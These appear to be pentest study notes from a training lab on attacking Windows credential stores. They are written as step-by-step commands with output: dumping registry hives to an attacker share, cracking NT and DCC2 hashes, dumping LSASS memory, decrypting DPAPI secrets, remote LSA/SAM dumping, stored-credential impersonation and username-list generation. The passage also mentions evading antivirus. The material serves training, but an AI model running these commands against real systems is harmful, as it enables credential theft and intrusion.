The Security Account Manager (_SAM_) is a database file in Windows OS that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored in hashes in the registry, typically in the form of either LM or NTLM hashes. The SAM file is located at ```%SystemRoot%\system32\config\SAM``` and is mounted under ```HKLM\SAM```. Viewing or accessing this file requires SYSTEM level privileges.

Windows system can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the DC must validate the credentials from the AD database (_ntds.dit_), which is stored in ```%SystemRoot%\ntds.dit```.

To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called SYSKEY (_syskey.exe_). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.

#### Credential Manager

![password attacks 2](../../images/password_attacks_2.png)

Credential Manager is a built-in feature of all Windows OS that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user's Credential Locker. The credentials are encrypted and stored in at ```C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\```.

There are various methods to decrypt credentials saved using Credential Manager.

#### NTDS

It is very common to encounter network environments where Windows systems are joined to a Windows domain. This setup simplifies centralized management, allowing admins to efficiently oversee all systems within their organization. In such environments, logon requests are sent to DCs within the same AD forest. Each DC hosts a file called NTDS.dit, which is synchronized across all DCs, with the exception of Read-Only DCs.

NTDS.dit is a database file that stores AD data, including but not limited to:

- user accounts (_username & password hashes_)
- group accounts
- computer accounts
- group policy objects

### Attacking SAM, SYSTEM, and SECURITY

With administrative access to a Windows system, you can attempt to quickly dump the files associated with the SAM database, transfer them to your attack host, and begin cracking the hashes offline. Performing this process offline allows you to continue your attacks without having to maintain an active session with the target.

#### Registry Hives

There are three registry hives you can copy if you have local administrative access to a target system, each serving a specific purpose when it comes to dunping and cracking password hashes.

| Registry Hive | Description |
| ------------- | ----------- |
| HKLM\SAM | contains password hashes for local user accounts; these hashes can be extracted and cracked to reveal plaintext passwords |
| HKLM\SYSTEM | stores the system boot key, which is used to encrypt the SAM database; this key is required to decrypt the hashes |
| HKLM\SECURITY | contains sensitive information used by the LSA, including cached domain credentials, cleartext passwords, DPAPI keys, and more |

##### Using reg.exe to copy Registry Hives

You can back up these hives using the reg.exe utility.

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

If you're only interested in dumping the hashes of local users, you need only HKLM\SAM and HKLM\SYSTEM. However, it's often useful to save HKLM\SECURITY as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, you can use various methods to transfer them to your attack host.

##### Creating a Share with smbserver

To create the share, you simply run ```smbserver.py -smb2support```, specify a name for the share, and point to the local directory on your attack host where the hive will be stored. The ```-smb2support``` flag ensures compatibility with newer versions of SMB. If you do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to numerous severe vulns and publicly available exploits.

```bash
d41y@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

##### Moving Hive Copies to Share

Once the share is running on your attack host, you can use the ```move``` command on the Windows target to transfer the hive copies to the share.

```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

You can confirm that your hive copies were successfully moved to the share by navigating to the shared directory on your attack host and using ```ls``` to list the files:

```bash
d41y@htb[/htb]$ ls

sam.save  security.save  system.save
```

#### Dumping Hashes with secretsdump

One particularly useful tool for dumping hashes offline is Impacket's secretsdump.

Using secretsdump is straightforward. You simply run the script with Python and specify each of the hive files you retrieved from the target host:

```bash
d41y@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
``` 

Here you see that secretsdump successfully dumped the local SAM hashes, along with data from hklm\security, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step secretsdump performs is retrieving the system bootkey before proceeding to dump the local SAM hashes. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted - which is why having copies of the relevant registry hives is crucial.

Notice the following line:

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells you how to interpret the output and which hashes you can attempt to crack. Most modern Windows OS store passwords as NT hashes. Older systems may store passwords as LM hashes, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.

With this in mind, you can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.

#### Cracking Hashes with Hashcat

Once you have the hashes, you can begin cracking them using Hashcat. Hashcat supports a wide range of hashing algorithms.

You can populate a text file with the NT hashes you were able to dump:

```bash
d41y@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

##### Running Hashcat against NT hashes

Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type you want to crack.

```bash
d41y@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

You can see from the output that Hashcat was successful in cracking three of the hashes. Having these passwords can be useful in many ways. For example, you could attempt to use the cracked credentials to access other systems on the network. It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. You will benefit from it anytime you encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.

Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are documented within the MITRE ATT&CK framework.

#### DCC2 Hashes

hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash. The Hashcat mode for cracking DCC2 hashes is 2100.

```bash
d41y@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
Time.Started.....: Tue Apr 22 09:12:53 2025 (27 secs)
Time.Estimated...: Tue Apr 22 09:13:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 149504/14344385 (1.04%)
Rejected.........: 0/149504 (0.00%)
Restore.Point....: 148992/14344385 (1.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
Candidate.Engine.: Device Generator
Candidates.#1....: ilovelloyd -> gerber1
Hardware.Mon.#1..: Util: 95%

Started: Tue Apr 22 09:12:33 2025
Stopped: Tue Apr 22 09:13:22 2025
```

Note the cracking speed of 5536 H/s. On the same machine, NTLM hashes can be cracked at 4605.4 kH/s. This means that cracking DCC2 hashes is approximately 800 times slower. The exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical pentests.

#### DPAPI

In addition to the DCC2 hashes, you previously saw that the machine and user keys for DPAPI were also dumped from hklm\security. The Data Protection Application Programming Interface, or DPAPI, is a set of APIs in Windows OS used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

| Application | Use of DPAPI |
| ----------- | ------------ |
| Internet Explorer | password form auto-completion data |
| Google Chrome | password from auto-completion data |
| Outlook | passwords for email accounts |
| Remote Desktop Connection | saved credentials for connections to remote machines |
| Credential Manager | saved credentials for accessing shared resources, joining wireless networks, VPNs and more |

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI.

```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

#### Remote Dumping & LSA Secrets Considerations

With access to credentials that have local administrator privileges, it is also possible to target LSA secrets over the network. This may allow you to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

##### Dumping LSA Secrets Remotely

```bash
d41y@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

##### Dumping SAM Remotely

```bash
d41y@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

### Attacking LSASS

LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

![password attacks 3](../../images/password_attacks_3.png)

Upon initial logon, LSASS will:

- cache credentials locally in memory
- create access tokens
- enforce security policies
- write to Windows' security log

#### Dumping LSASS Process Memory

Similar to the process of attacking the SAM database, it would be wise for you first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets you extract credentials offline using your attack host. Keep in mind conducting attacks offline gives you more flexibility in the speed of your attack and requires less time spent on the target system. There are countless methods you can use to create a memory dump.

##### Task Manager Method

With access to an interactive graphical session on the target, you can use task manager to create a memory dump.

1. open Task Manager
2. select the ```Processes``` tab
3. find and click the ```Local Security Authority Process```
4. select ```Create dump file```

A file called ```lsass.DMP``` is created and saved in ```%temp%```. This is the file you will transfer to your attack host.

##### Rundll32.exe & Comsvcs.dll Method

The Task Manager method is dependent on you having a GUI-based interactive session with a target. You can use an alternative method to dump LSASS process memory through a command-line utility called ```rundll32.exe```. This way is faster than the Task Manager method and more flexible because you may gain a shell session on a Windows host with only access to the command line. It is important to note that modern AV tools recognize this method as malicious activity.

Before issuing the command to create the dump file, you must determine what process ID (_PID_) is assigned to ```lsass.exe```. This can be done from cmd or PowerShell.

For cmd you can use:

```
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

For PowerShell you can use:

```ps
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Once you have the PID assigned to the LSASS process, you can create a dump file:

```ps
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, you are running ```rund32.dll``` to call an exported function of ```comsvcs.dll``` which also calls the MiniDumpWriteDump (_MiniDump_) function to dump the LSASS process memory to a specified directory (_C:\lsass.dmp_). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, you will need to consider ways to bypass or disable the AV tool you are facing.

If you manage to run this command and generate the ```lsass.dmp``` file, you can proceed to transfer the file onto your attack host to attempt to extract any credentials that may have been stored in LSASS process memory.

#### Using Pypykatz to extract Credentials

Once you have the dump file on your attack host, you can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials from the ```.dmp``` file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows you to run it on Linux-based attack hosts. At the time of writing, Mimikatz only runs on Windows systems, so to use it, you would either need to use a Windows attack host or you would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all you need is a copy of the dump file, and you can run it offline from your Linux-based attack host.

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When you dumped LSASS process memory into the file, you essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.

The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. You use ```lsa``` in the command line because LSASS is a subsystem of the Local Security Authority, then you specify the data source as a minidump file, proceeded by the path to the dump file stored on your attack host. Pypykatz parses the dump file and outputs the findings:

```bash
d41y@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Taking a look at the ```MSV``` part: MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory.

Taking a look at the ```WDIGEST``` part: WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if you find yourself targeting a Windows system with WDIGEST enabled, you will most likely see a password in clear-text. Modern Windows OS have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.

Taking a look at the ```Kerberos``` part: Kerberos is a network authentication protocol used by AD in Windows Domain environments. Domain user accounts are granted tickets upon authentication with AD. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

Taking a look at the ```DPAPI``` part: Mimikatz and Pypykatz can extract the DPAPI masterkey for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.

#### Cracking the NT Hash with Hashcat

```bash
d41y@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

### Attacking Windows Credential Manager

Credential Manager is a feature built into Windows Server 2008 R2 and Windows 7. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles:

- ```%UserProfile%\AppData\Local\Microsoft\Vault\```
- ```%UserProfile%\AppData\Local\Microsoft\Credentials\```
- ```%UserProfile%\AppData\Roaming\Microsoft\Vault\```
- ```%ProgramData%\Microsoft\Vault\```
- ```%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\```

Each vault folder contains a ```Policy.pol``` file with AES keys that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys storing them in secured memory enclaves.

Microsoft often refers to the protected stores as Credential Lockers. Credenial Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:

| Name | Description |
| ---- | ----------- |
| Web Credentials | credentials associated with websites and online accounts; this locker is used by Internet Explorer and legacy versions if Microsoft Edge |
| Windows Credentials | used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories |

It is possible to export Windows Vaults to ```.crd``` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.

```
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

#### Enumerating Credentials with cmdkey

You can use cmdkey to enumerate the credentials stored in the current user's profile:

```
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Stored credentials are listed with the following format:

| Key | Value |
| --- | ----- |
| Target | the resource or account name the credential is for; this could be a computer, domain name, or a special identifier |
| Type | the kind of credential; common types are Generic for general credentials, and Domain Password for domain user logons |
| User | the user account associated with the credential |
| Persistence | some credentials indicate whether a credential is saved persistently on the computer; credentials marked with "Local machine persistence" survive reboots |

The first credential in the command output above (```virtualapp/didlogical```) is a generic credential used by Microsoft account / Windows Live services. The random looking username is an internal account ID. This entry may be ignored for your purposes.

The second credential (```Domain:interactive=SRV01\mcharles```) is a domain credential associated with the user SRV01\mcharles. Interactive means that the credential is used for interactive logon sessions. Whenever you come across this type of credential, you can use ```runas``` to impersonate the stored user like so:

```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

#### Extracting Credentials with Mimikatz

There are many different tools that can be used to decrypt stored credentials. One of the tools you can use is mimikatz. Even within mimikatz, there are multiple ways to attack these credentials - you can either dump credentials from memory using the ```sekurlsa``` module, or you can manually decrypt credentials using the ```dpapi``` module.

```
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

### Attacking AD and NTDS.dit

![password attacks 4](../../images/password_attacks_4.png)

Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send authentication requests to be validated by the DC before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device preceeded by the username (_WS01\nameofuser_) or with direct access to the device then typing ```.\``` at the logon UI in the username field. This is worthy of consideration because you need to be mindful of what system components are impacted by the attacks you perform. It can also give you additional avenues of attack to consider when targeting Windows desktop OS or Windows server OS with direct physical access over a network. Keep in mind that you can also study NTDS attacks by keeping track of [this technique](https://attack.mitre.org/techniques/T1003/003/).

#### Dictionary Attacks against AD Accounts using NetExec

> [!NOTE]
> Keep in mind that a dictionary attack is essentially using the power of a computer to guess usernames and/or passwords using a customized list of potential usernames and passwords. It can be rather noisy to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restriction that may be applied through the use of Group Policy.

When you find yourself in a scenario where a dictionary attack is a viable next step, you can benefit from trying to tailor your attack as much as possible. Many organizations follow a naming convention when creating employee usernames. Some common convetions are:

- firstinitiallastname
- firstinitialmiddleinitiallastname
- firstnamelastname
- firstname.lastname
- lastname.firstname
- nickname

Often, an email address's structure will give you the employee's username.

##### Creating a Custom List of Usernames

You can manually create your list(s) or use an automated list generator such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

```bash
d41y@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

##### Enumerating Valid Usernames with Kerbrute

